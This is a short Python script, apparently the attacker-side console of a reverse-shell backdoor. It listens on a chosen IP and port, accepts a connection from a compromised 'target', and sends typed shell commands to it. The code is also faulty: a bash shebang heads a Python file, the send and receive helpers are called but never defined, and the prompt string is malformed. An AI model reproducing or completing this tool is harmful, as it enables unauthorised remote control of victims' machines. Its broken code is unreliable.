#!bin/bash
import socket

def target_communcation():
    while True:
        command = input(f'* Shell~%s: ' %{ip})
        reliable_send(command)
        if command == 'quit': 
            break
        else: 
            result = reliable_recv()
            print(result)

ip_address = input("Type IP Address to Connect to >>> ")
port = int(input("Type Port to Connect to >>"))


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((ip_address, port ))
sock.listen(5)
target, ip = sock.accept()

print(f'Connected to: {ip}')

target_communcation()
